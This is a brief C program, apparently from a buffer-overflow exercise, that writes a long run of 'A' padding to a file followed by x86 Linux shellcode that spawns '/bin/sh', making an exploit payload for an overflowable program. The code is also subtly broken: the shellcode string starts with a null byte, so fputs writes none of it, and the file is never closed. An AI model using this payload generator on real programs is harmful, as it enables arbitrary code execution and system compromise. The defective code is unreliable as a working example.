#include <stdio.h>

int main()
{
	FILE *fp;
	char shellcode[] = "\0\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	char somstr[] = "this is a string\n";
	fp = fopen("longstring.txt", "w+");
	for (int i = 0; i < 1024; i++) {
		fputs("A", fp);
	}
	fputs(shellcode,fp);

//debug code
//	fp = fopen("charsend.txt", "w+");
//	fputs(somstr,fp);
//	fclose(fp);
}
